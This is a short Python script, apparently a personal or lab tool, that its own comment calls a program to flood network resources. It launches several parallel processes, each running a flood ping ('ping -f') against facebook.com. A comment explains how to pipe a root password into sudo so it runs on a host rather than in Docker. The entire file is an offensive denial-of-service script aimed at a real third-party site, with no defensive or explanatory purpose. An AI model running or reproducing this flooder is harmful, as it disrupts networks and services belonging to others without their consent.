#Program to flood network resources
#Replace Password with root password

import os
import time
import multiprocessing

print("Running packet flooder")

#increase later
def pinger():
	#add sudo -S before ping if want to run host rather than docker
	os.system("echo Password | ping -f facebook.com -c 1000")

parent_process=multiprocessing.Process(target=pinger)
parent_process.start()

for x in range(4):
	temp_thread=multiprocessing.Process(target=pinger)
	temp_thread.start()	
	time.sleep(1)